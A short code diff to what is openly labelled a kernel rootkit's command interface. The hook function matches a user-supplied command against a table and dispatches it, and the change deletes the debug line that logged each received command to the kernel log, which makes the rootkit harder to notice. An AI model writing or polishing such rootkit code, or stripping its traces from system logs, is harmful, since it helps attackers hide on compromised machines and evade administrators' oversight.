@@ -80,7 +80,6 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
 
   for (i = 0; i < sizeof(iface__commands) / sizeof(iface__commands[0]); i++) {
     if (!strcmp(command_buf, iface__commands[i].command)) {
-      printk(KERN_INFO "[rootkit interface] got command \"%s\".\n", command_buf);/////////////////////////////
       handler = iface__commands[i].handler;
       break;
     }
